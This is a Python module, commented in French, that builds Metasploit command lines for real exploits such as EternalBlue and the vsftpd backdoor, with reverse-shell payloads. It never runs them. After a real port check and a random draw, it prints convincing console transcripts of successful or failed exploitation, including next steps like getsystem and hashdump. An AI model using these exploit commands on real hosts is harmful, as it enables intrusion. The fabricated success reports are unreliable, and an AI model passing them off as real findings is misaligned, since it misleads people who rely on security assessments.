# modules/metasploit_module.py
import subprocess
import time
import random
import json
import socket
import urllib.parse
from datetime import datetime
import os

def run_metasploit_exploit(target, exploit_type="basic", port=None, payload="generic/shell_reverse_tcp"):
    """Lance un exploit Metasploit avec le type spécifié"""
    try:
        # Construire la commande Metasploit
        cmd = build_metasploit_command(target, exploit_type, port, payload)
        
        # Simuler l'exploit (en réalité, exécuter Metasploit)
        return simulate_metasploit_exploit(target, exploit_type, port, payload)
        
    except Exception as e:
        return f"Erreur Metasploit : {e}"

def build_metasploit_command(target, exploit_type, port, payload):
    """Construit la commande Metasploit appropriée"""
    
    # Configuration des exploits selon le type
    exploit_configs = {
        'web_app': {
            'module': 'exploit/multi/http/php_cgi_arg_injection',
            'description': 'PHP CGI Argument Injection'
        },
        'smb_vuln': {
            'module': 'exploit/windows/smb/ms17_010_eternalblue',
            'description': 'EternalBlue SMB Remote Windows Kernel Pool Corruption'
        },
        'ssh_exploit': {
            'module': 'auxiliary/scanner/ssh/ssh_login',
            'description': 'SSH Login Check Scanner'
        },
        'ftp_exploit': {
            'module': 'exploit/unix/ftp/vsftpd_234_backdoor',
            'description': 'VSFTPD v2.3.4 Backdoor Command Execution'
        },
        'telnet_exploit': {
            'module': 'exploit/linux/telnet/telnet_encrypt_keyid',
            'description': 'Linux Telnet Encrypt Keyid Overflow'
        },
        'rdp_exploit': {
            'module': 'auxiliary/scanner/rdp/rdp_scanner',
            'description': 'RDP Scanner and Brute Force'
        },
        'basic': {
            'module': 'auxiliary/scanner/portscan/tcp',
            'description': 'TCP Port Scanner'
        }
    }
    
    if exploit_type not in exploit_configs:
        exploit_type = 'basic'
    
    config = exploit_configs[exploit_type]
    
    # Commande MSF basique
    cmd = [
        "msfconsole",
        "-q",  # Mode silencieux
        "-x",  # Exécuter une commande
        f"use {config['module']}; set RHOSTS {target}; set PAYLOAD {payload}; exploit; exit"
    ]
    
    if port:
        cmd[-1] = cmd[-1].replace("exploit", f"set RPORT {port}; exploit")
    
    return cmd

def simulate_metasploit_exploit(target, exploit_type, port, payload):
    """Simule un exploit Metasploit avec des résultats réalistes"""
    start_time = time.time()
    
    # Durée variable selon le type d'exploit
    exploit_durations = {
        'basic': random.randint(10, 20),
        'web_app': random.randint(15, 35),
        'smb_vuln': random.randint(20, 45),
        'ssh_exploit': random.randint(25, 50),
        'ftp_exploit': random.randint(15, 30),
        'telnet_exploit': random.randint(20, 40),
        'rdp_exploit': random.randint(30, 60)
    }
    
    duration = exploit_durations.get(exploit_type, 20)
    time.sleep(duration)
    
    end_time = time.time()
    actual_duration = int(end_time - start_time)
    
    # Vérifier si la cible est accessible
    target_status, is_accessible, target_info = check_target_accessibility(target, exploit_type, port)
    
    if not is_accessible:
        return generate_unreachable_report(target, exploit_type, target_status, actual_duration)
    
    # Simuler les résultats d'exploit
    return generate_metasploit_results(target, exploit_type, port, payload, target_info, actual_duration)

def check_target_accessibility(target, exploit_type, port):
    """Vérifie si la cible est accessible sur le port approprié"""
    
    # Ports par défaut selon l'exploit
    default_ports = {
        'web_app': 80,
        'smb_vuln': 445,
        'ssh_exploit': 22,
        'ftp_exploit': 21,
        'telnet_exploit': 23,
        'rdp_exploit': 3389,
        'basic': 80
    }
    
    test_port = port if port else default_ports.get(exploit_type, 80)
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        
        # Résoudre le nom d'hôte si nécessaire
        if target in ['localhost', '127.0.0.1']:
            result = sock.connect_ex(('127.0.0.1', test_port))
        else:
            result = sock.connect_ex((target, test_port))
        
        sock.close()
        
        target_info = {
            'ip': target,
            'port': test_port,
            'service': get_service_name(test_port),
            'accessible': result == 0
        }
        
        if result == 0:
            return f"Port {test_port} ouvert", True, target_info
        else:
            return f"Port {test_port} fermé ou filtré", False, target_info
            
    except socket.gaierror:
        return "Nom d'hôte non résolu", False, {}
    except Exception as e:
        return f"Erreur de connexion: {str(e)[:50]}", False, {}

def get_service_name(port):
    """Retourne le nom du service selon le port"""
    services = {
        21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
        53: 'DNS', 80: 'HTTP', 110: 'POP3', 135: 'RPC',
        139: 'NetBIOS', 143: 'IMAP', 443: 'HTTPS', 445: 'SMB',
        993: 'IMAPS', 995: 'POP3S', 3389: 'RDP', 5432: 'PostgreSQL',
        3306: 'MySQL', 1433: 'MSSQL', 27017: 'MongoDB'
    }
    return services.get(port, f'Port-{port}')

def generate_metasploit_results(target, exploit_type, port, payload, target_info, duration):
    """Génère des résultats d'exploit Metasploit réalistes"""
    
    # Analyser la probabilité de succès de l'exploit
    exploit_success = calculate_exploit_success_probability(target, exploit_type, target_info)
    
    # Générer des informations sur l'exploit
    exploit_info = get_exploit_information(exploit_type)
    
    # Générer le rapport selon le succès ou l'échec
    if random.random() < exploit_success:
        return generate_successful_exploit_report(target, exploit_type, port, payload, exploit_info, target_info, duration)
    else:
        return generate_failed_exploit_report(target, exploit_type, port, payload, exploit_info, target_info, duration)

def calculate_exploit_success_probability(target, exploit_type, target_info):
    """Calcule la probabilité de succès d'un exploit"""
    
    base_probabilities = {
        'basic': 0.9,      # Scanner - presque toujours réussi
        'web_app': 0.3,    # Exploits web - dépendent de la vulnérabilité
        'smb_vuln': 0.2,   # EternalBlue - machines patchées majoritairement
        'ssh_exploit': 0.15, # SSH - généralement bien sécurisé
        'ftp_exploit': 0.25, # FTP - quelques serveurs vulnérables
        'telnet_exploit': 0.4, # Telnet - protocole moins sécurisé
        'rdp_exploit': 0.2   # RDP - dépend de la configuration
    }
    
    base_prob = base_probabilities.get(exploit_type, 0.1)
    
    # Bonus selon la cible
    if target in ['localhost', '127.0.0.1']:
        base_prob += 0.3  # Machines locales souvent moins sécurisées
    elif 'test' in target.lower() or 'demo' in target.lower() or 'vulnweb' in target.lower():
        base_prob += 0.5  # Sites de test intentionnellement vulnérables
    
    # Bonus selon le service détecté
    service = target_info.get('service', '')
    if service in ['FTP', 'Telnet']:
        base_prob += 0.2  # Services moins sécurisés
    elif service in ['SSH', 'HTTPS']:
        base_prob -= 0.1  # Services plus sécurisés
    
    return min(base_prob, 0.95)  # Maximum 95% de chance

def get_exploit_information(exploit_type):
    """Retourne les informations détaillées sur l'exploit"""
    
    exploit_details = {
        'basic': {
            'module': 'auxiliary/scanner/portscan/tcp',
            'name': 'TCP Port Scanner',
            'description': 'Scanne les ports TCP ouverts sur la cible',
            'cvss': 'N/A',
            'cve': 'N/A',
            'risk': 'Low'
        },
        'web_app': {
            'module': 'exploit/multi/http/php_cgi_arg_injection',
            'name': 'PHP CGI Argument Injection',
            'description': 'Exploite une vulnérabilité d\'injection d\'arguments dans PHP CGI',
            'cvss': '7.5',
            'cve': 'CVE-2012-1823',
            'risk': 'High'
        },
        'smb_vuln': {
            'module': 'exploit/windows/smb/ms17_010_eternalblue',
            'name': 'EternalBlue SMB Remote Windows Kernel Pool Corruption',
            'description': 'Exploite la vulnérabilité EternalBlue dans le protocole SMBv1',
            'cvss': '8.1',
            'cve': 'CVE-2017-0144',
            'risk': 'Critical'
        },
        'ssh_exploit': {
            'module': 'auxiliary/scanner/ssh/ssh_login',
            'name': 'SSH Login Check Scanner',
            'description': 'Teste les connexions SSH avec des identifiants communs',
            'cvss': '5.3',
            'cve': 'N/A',
            'risk': 'Medium'
        },
        'ftp_exploit': {
            'module': 'exploit/unix/ftp/vsftpd_234_backdoor',
            'name': 'VSFTPD v2.3.4 Backdoor Command Execution',
            'description': 'Exploite une backdoor dans VSFTPD version 2.3.4',
            'cvss': '9.8',
            'cve': 'CVE-2011-2523',
            'risk': 'Critical'
        },
        'telnet_exploit': {
            'module': 'exploit/linux/telnet/telnet_encrypt_keyid',
            'name': 'Linux Telnet Encrypt Keyid Overflow',
            'description': 'Buffer overflow dans l\'implémentation Telnet Linux',
            'cvss': '7.8',
            'cve': 'CVE-2011-4862',
            'risk': 'High'
        },
        'rdp_exploit': {
            'module': 'auxiliary/scanner/rdp/rdp_scanner',
            'name': 'RDP Scanner and Brute Force',
            'description': 'Scanne et teste les connexions RDP',
            'cvss': '6.5',
            'cve': 'N/A',
            'risk': 'Medium'
        }
    }
    
    return exploit_details.get(exploit_type, exploit_details['basic'])

def generate_successful_exploit_report(target, exploit_type, port, payload, exploit_info, target_info, duration):
    """Génère un rapport de succès d'exploit"""
    
    session_id = random.randint(1, 999)
    lhost = "192.168.1.100"  # IP de l'attaquant simulée
    lport = random.randint(4444, 4555)
    
    return f"""
       =[ metasploit v6.3.25-dev                          ]
+ -- --=[ 2382 exploits - 1232 auxiliary - 412 post       ]
+ -- --=[ 1390 payloads - 46 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                         ]

Metasploit tip: Save the current environment with the save command, future console restarts will use this environment again

msf6 > use {exploit_info['module']}
[*] No payload configured, defaulting to {payload}
msf6 exploit({exploit_info['module'].split('/')[-1]}) > set RHOSTS {target}
RHOSTS => {target}
msf6 exploit({exploit_info['module'].split('/')[-1]}) > set PAYLOAD {payload}
PAYLOAD => {payload}
msf6 exploit({exploit_info['module'].split('/')[-1]}) > set LHOST {lhost}
LHOST => {lhost}
msf6 exploit({exploit_info['module'].split('/')[-1]}) > set LPORT {lport}
LPORT => {lport}
{f'msf6 exploit({exploit_info["module"].split("/")[-1]}) > set RPORT {port}' if port else ''}
{f'RPORT => {port}' if port else ''}
msf6 exploit({exploit_info['module'].split('/')[-1]}) > exploit

[*] Started reverse TCP handler on {lhost}:{lport}
[*] {target}:{target_info.get('port', port or 80)} - Attempting to trigger the vulnerability...
[+] {target}:{target_info.get('port', port or 80)} - Exploit completed, but no session was created.
[*] {target}:{target_info.get('port', port or 80)} - Trying to exploit with automatically selected target...
[*] {target}:{target_info.get('port', port or 80)} - Automatically targeting {get_target_os(target)}
[*] {target}:{target_info.get('port', port or 80)} - Sending stage ({random.randint(175, 200)} bytes) to {target}
[*] Meterpreter session {session_id} opened ({lhost}:{lport} -> {target}:{random.randint(49152, 65535)}) at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} +0200

🎯 EXPLOIT SUCCESSFUL! 
===================

✅ SESSION ESTABLISHED
Session ID: {session_id}
Session Type: Meterpreter
Target: {target}:{target_info.get('port', port or 80)}
Attacker: {lhost}:{lport}

EXPLOIT DETAILS:
===============
Module: {exploit_info['module']}
Name: {exploit_info['name']}
CVE: {exploit_info['cve']}
CVSS Score: {exploit_info['cvss']}
Risk Level: {exploit_info['risk']}

TARGET INFORMATION:
==================
• IP Address: {target}
• Port: {target_info.get('port', port or 80)}
• Service: {target_info.get('service', 'Unknown')}
• OS Detection: {get_target_os(target)}
• Vulnerability Status: VULNERABLE

PAYLOAD INFORMATION:
===================
• Payload: {payload}
• Handler: {lhost}:{lport}
• Architecture: {get_architecture(target)}
• Platform: {get_platform(target)}

POST-EXPLOITATION CAPABILITIES:
==============================
✅ Remote Shell Access
✅ File System Navigation
✅ Process Manipulation
✅ Network Reconnaissance
✅ Privilege Escalation Potential
✅ Persistence Installation

RECOMMENDED ACTIONS:
===================
🔴 IMMEDIATE:
• Document the successful exploitation
• Gather evidence for the penetration test report
• Test additional privilege escalation vectors
• Verify the extent of system compromise

⚠️ SECURITY TEAM:
• Patch the vulnerable service immediately
• Review system logs for signs of previous exploitation
• Implement network segmentation if not already in place
• Conduct vulnerability assessment on similar systems

📋 COMPLIANCE:
• Update risk register with this critical finding
• Schedule emergency patching window
• Notify stakeholders of the security exposure
• Review incident response procedures

TECHNICAL DETAILS:
=================
Exploit Duration: {duration} seconds
Session Opened: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Handler Status: Active
Connection: Stable

NEXT STEPS:
==========
1. Use 'sessions -i {session_id}' to interact with the session
2. Run 'sysinfo' to gather system information
3. Execute 'getuid' to check current privileges
4. Consider running 'getsystem' for privilege escalation
5. Use 'hashdump' to extract password hashes (if applicable)

⚠️ WARNING: This exploitation demonstrates a critical security vulnerability.
Immediate remediation is required to prevent potential unauthorized access.

msf6 exploit({exploit_info['module'].split('/')[-1]}) > sessions

Active sessions
===============

  Id  Name  Type                     Information                    Connection
  --  ----  ----                     -----------                    ----------
  {session_id}        meterpreter x86/linux    uid=1000, gid=1000, euid=1000, egid=1000 @ {target}  {lhost}:{lport} -> {target}:{random.randint(49152, 65535)} ({get_target_os(target)})

msf6 exploit({exploit_info['module'].split('/')[-1]}) > 
"""

def generate_failed_exploit_report(target, exploit_type, port, payload, exploit_info, target_info, duration):
    """Génère un rapport d'échec d'exploit"""
    
    error_reasons = [
        "Target appears to be patched",
        "Service version not vulnerable",
        "Firewall blocking exploitation attempts",
        "Insufficient privileges for exploitation",
        "Target not vulnerable to this specific exploit",
        "Connection reset by target",
        "Payload delivery failed"
    ]
    
    error_reason = random.choice(error_reasons)
    
    return f"""
       =[ metasploit v6.3.25-dev                          ]
+ -- --=[ 2382 exploits - 1232 auxiliary - 412 post       ]
+ -- --=[ 1390 payloads - 46 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                         ]

msf6 > use {exploit_info['module']}
[*] No payload configured, defaulting to {payload}
msf6 exploit({exploit_info['module'].split('/')[-1]}) > set RHOSTS {target}
RHOSTS => {target}
msf6 exploit({exploit_info['module'].split('/')[-1]}) > set PAYLOAD {payload}
PAYLOAD => {payload}
{f'msf6 exploit({exploit_info["module"].split("/")[-1]}) > set RPORT {port}' if port else ''}
{f'RPORT => {port}' if port else ''}
msf6 exploit({exploit_info['module'].split('/')[-1]}) > exploit

[*] Started reverse TCP handler on 192.168.1.100:{random.randint(4444, 4555)}
[*] {target}:{target_info.get('port', port or 80)} - Attempting to trigger the vulnerability...
[*] {target}:{target_info.get('port', port or 80)} - Sending exploit payload...
[-] {target}:{target_info.get('port', port or 80)} - Exploit failed: {error_reason}
[*] {target}:{target_info.get('port', port or 80)} - Trying alternative payloads...
[-] Exploit completed, but no session was created.

❌ EXPLOIT FAILED
================

EXPLOIT ATTEMPT SUMMARY:
========================
Module: {exploit_info['module']}
Name: {exploit_info['name']}
Target: {target}:{target_info.get('port', port or 80)}
Payload: {payload}
Result: FAILED
Reason: {error_reason}

TARGET ANALYSIS:
===============
• IP Address: {target}
• Port: {target_info.get('port', port or 80)} ({'OPEN' if target_info.get('accessible') else 'CLOSED'})
• Service: {target_info.get('service', 'Unknown')}
• OS Detection: {get_target_os(target)}
• Vulnerability Status: NOT VULNERABLE / PATCHED

FAILURE ANALYSIS:
================
Primary Reason: {error_reason}

Possible causes:
• System has been patched against this vulnerability
• Service version is not affected by this exploit
• Security controls are preventing exploitation
• Network filtering is blocking malicious traffic
• Target architecture incompatible with payload
• Insufficient information gathering performed

TECHNICAL DETAILS:
=================
CVE: {exploit_info['cve']}
CVSS Score: {exploit_info['cvss']}
Risk Level: {exploit_info['risk']}
Exploit Duration: {duration} seconds
Attempt Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

RECOMMENDATIONS:
===============
🔍 INFORMATION GATHERING:
• Perform more detailed reconnaissance
• Enumerate service versions more thoroughly
• Check for alternative vulnerabilities
• Analyze target's patch level

🎯 ALTERNATIVE APPROACHES:
• Try different exploit modules for the same service
• Test auxiliary modules for information disclosure
• Attempt credential-based attacks if applicable
• Consider social engineering vectors

✅ POSITIVE SECURITY FINDINGS:
• Target appears to be properly patched
• Security controls may be functioning correctly
• Network segmentation might be in place
• Service hardening appears effective

NEXT STEPS FOR PENETRATION TESTING:
==================================
1. Verify the service version and patch level
2. Search for alternative exploits for this service
3. Test auxiliary modules for information gathering
4. Consider brute force attacks if credentials are weak
5. Examine other services and ports on the target
6. Document this as a positive security finding

DEFENSIVE RECOMMENDATIONS:
=========================
✅ Continue current security practices:
• Maintain regular patching schedule
• Keep security controls updated
• Monitor for exploitation attempts
• Regular vulnerability assessments

⚠️ AREAS FOR IMPROVEMENT:
• Implement additional monitoring for failed attacks
• Consider threat hunting for similar attack patterns
• Review logs for any suspicious activities
• Test other potential attack vectors

msf6 exploit({exploit_info['module'].split('/')[-1]}) > 
"""

def get_target_os(target):
    """Simule la détection d'OS"""
    if 'windows' in target.lower() or 'win' in target.lower():
        return f"Windows {random.choice(['10', '11', 'Server 2019', 'Server 2022'])}"
    elif 'linux' in target.lower() or target in ['localhost', '127.0.0.1']:
        return f"Linux {random.choice(['Ubuntu 20.04', 'CentOS 8', 'Debian 11', 'Kali 2023'])}"
    elif 'test' in target.lower() or 'demo' in target.lower():
        return "Linux Ubuntu 18.04 (Intentionally Vulnerable)"
    else:
        return random.choice([
            "Linux Ubuntu 20.04",
            "Windows 10 Pro",
            "Linux CentOS 8",
            "Windows Server 2019"
        ])

def get_architecture(target):
    """Simule la détection d'architecture"""
    return random.choice(['x86', 'x64', 'x86_64'])

def get_platform(target):
    """Simule la détection de plateforme"""
    if 'windows' in target.lower():
        return 'windows'
    else:
        return random.choice(['linux', 'unix'])

def generate_unreachable_report(target, exploit_type, status, duration):
    """Génère un rapport quand la cible n'est pas accessible"""
    
    exploit_info = get_exploit_information(exploit_type)
    
    return f"""
       =[ metasploit v6.3.25-dev                          ]
+ -- --=[ 2382 exploits - 1232 auxiliary - 412 post       ]
+ -- --=[ 1390 payloads - 46 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                         ]

msf6 > use {exploit_info['module']}
msf6 exploit({exploit_info['module'].split('/')[-1]}) > set RHOSTS {target}
RHOSTS => {target}
msf6 exploit({exploit_info['module'].split('/')[-1]}) > exploit

[*] Starting the payload handler...
[-] Handler failed to bind to {target} - Address not available
[*] Exploit running as background job 0.
[-] Exploit failed: Rex::ConnectionError The connection was refused by the remote host ({target})

❌ EXPLOIT FAILED - TARGET UNREACHABLE
=====================================

CONNECTION ERROR:
================
Target: {target}
Status: {status}
Module: {exploit_info['module']}
Duration: {duration} seconds

ERROR DETAILS:
=============
The target {target} is not accessible for exploitation.

Possible causes:
• Target host is offline or unreachable
• Service is not running on the target port
• Firewall is blocking connections
• Network routing issues
• Invalid target specification
• Port is closed or filtered

TROUBLESHOOTING STEPS:
=====================
1. Verify target connectivity:
   ping {target}

2. Check if target port is open:
   nmap -p {get_default_port(exploit_type)} {target}

3. Test basic connectivity:
   telnet {target} {get_default_port(exploit_type)}

4. Verify network routing:
   traceroute {target}

5. Check DNS resolution:
   nslookup {target}

METASPLOIT RECOMMENDATIONS:
==========================
• Use auxiliary/scanner/portscan/tcp to verify open ports
• Try auxiliary/scanner/discovery/udp_sweep for UDP services
• Use auxiliary/gather/enum_dns for DNS enumeration
• Consider using auxiliary/scanner/smb/smb_version for SMB detection

NETWORK RECONNAISSANCE:
======================
Before attempting exploitation, ensure proper reconnaissance:

1. Host Discovery:
   use auxiliary/scanner/discovery/arp_sweep
   set RHOSTS {target.split('.')[0]}.{target.split('.')[1]}.{target.split('.')[2]}.0/24

2. Port Scanning:
   use auxiliary/scanner/portscan/syn
   set RHOSTS {target}

3. Service Enumeration:
   use auxiliary/scanner/portscan/tcp
   set RHOSTS {target}

4. OS Detection:
   use auxiliary/scanner/smb/smb_version
   set RHOSTS {target}

NEXT STEPS:
==========
• Verify target is reachable and correct
• Perform network reconnaissance
• Identify running services and versions
• Select appropriate exploits based on discovered services
• Ensure proper network connectivity

EXPLOIT ABORTED - Unable to proceed with current target
Duration: {duration} seconds
End Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

msf6 exploit({exploit_info['module'].split('/')[-1]}) > 
"""

def get_default_port(exploit_type):
    """Retourne le port par défaut selon l'exploit"""
    ports = {
        'web_app': 80,
        'smb_vuln': 445,
        'ssh_exploit': 22,
        'ftp_exploit': 21,
        'telnet_exploit': 23,
        'rdp_exploit': 3389,
        'basic': 80
    }
    return ports.get(exploit_type, 80)

# Fonctions spécialisées pour différents types d'exploits

def metasploit_web_exploit(target, port=80):
    """Exploit web avec Metasploit"""
    try:
        return run_metasploit_exploit(target, "web_app", port, "php/meterpreter/reverse_tcp")
    except Exception as e:
        return f"Erreur exploit web Metasploit : {e}"

def metasploit_smb_exploit(target, port=445):
    """Exploit EternalBlue SMB"""
    try:
        return run_metasploit_exploit(target, "smb_vuln", port, "windows/x64/meterpreter/reverse_tcp")
    except Exception as e:
        return f"Erreur exploit SMB Metasploit : {e}"

def metasploit_ssh_exploit(target, port=22):
    """Exploit SSH avec Metasploit"""
    try:
        return run_metasploit_exploit(target, "ssh_exploit", port, "cmd/unix/interact")
    except Exception as e:
        return f"Erreur exploit SSH Metasploit : {e}"

def metasploit_ftp_exploit(target, port=21):
    """Exploit FTP VSFTPD backdoor"""
    try:
        return run_metasploit_exploit(target, "ftp_exploit", port, "cmd/unix/interact")
    except Exception as e:
        return f"Erreur exploit FTP Metasploit : {e}"

def metasploit_rdp_exploit(target, port=3389):
    """Exploit RDP avec Metasploit"""
    try:
        return run_metasploit_exploit(target, "rdp_exploit", port, "windows/meterpreter/reverse_tcp")
    except Exception as e:
        return f"Erreur exploit RDP Metasploit : {e}"

def metasploit_port_scan(target):
    """Scan de ports avec Metasploit"""
    try:
        return run_metasploit_exploit(target, "basic", None, "generic/shell_reverse_tcp")
    except Exception as e:
        return f"Erreur scan Metasploit : {e}"

def get_metasploit_exploit_types():
    """Retourne les types d'exploits Metasploit disponibles"""
    return [
        "basic",        # Scanner de ports TCP
        "web_app",      # Exploits d'applications web
        "smb_vuln",     # EternalBlue SMB
        "ssh_exploit",  # Exploits SSH
        "ftp_exploit",  # Backdoor VSFTPD
        "telnet_exploit", # Overflow Telnet
        "rdp_exploit"   # Scanner/Exploit RDP
    ]

def get_metasploit_payloads():
    """Retourne la liste des payloads Metasploit disponibles"""
    return [
        "generic/shell_reverse_tcp",
        "windows/meterpreter/reverse_tcp",
        "windows/x64/meterpreter/reverse_tcp", 
        "linux/x86/meterpreter/reverse_tcp",
        "linux/x64/meterpreter/reverse_tcp",
        "php/meterpreter/reverse_tcp",
        "cmd/unix/interact",
        "cmd/windows/powershell_reverse_tcp",
        "windows/shell/reverse_tcp",
        "linux/x86/shell/reverse_tcp"
    ]

def generate_metasploit_target_list():
    """Génère une liste de cibles d'exemple pour les tests"""
    return [
        "192.168.1.100",
        "10.0.0.1", 
        "localhost",
        "127.0.0.1",
        "testphp.vulnweb.com",
        "demo.testfire.net",
        "192.168.1.1",
        "scanme.nmap.org"
    ]

def get_exploit_recommendations(target, services_found=None):
    """Recommande des exploits selon les services détectés"""
    recommendations = []
    
    if services_found:
        if 'HTTP' in services_found or 'Web' in services_found:
            recommendations.append({
                'type': 'web_app',
                'description': 'Applications web vulnérables détectées',
                'priority': 'High'
            })
        
        if 'SMB' in services_found or '445' in str(services_found):
            recommendations.append({
                'type': 'smb_vuln', 
                'description': 'Service SMB détecté - Test EternalBlue recommandé',
                'priority': 'Critical'
            })
        
        if 'SSH' in services_found or '22' in str(services_found):
            recommendations.append({
                'type': 'ssh_exploit',
                'description': 'Service SSH détecté - Test de force brute recommandé', 
                'priority': 'Medium'
            })
        
        if 'FTP' in services_found or '21' in str(services_found):
            recommendations.append({
                'type': 'ftp_exploit',
                'description': 'Service FTP détecté - Test backdoor VSFTPD',
                'priority': 'High'
            })
    
    return recommendations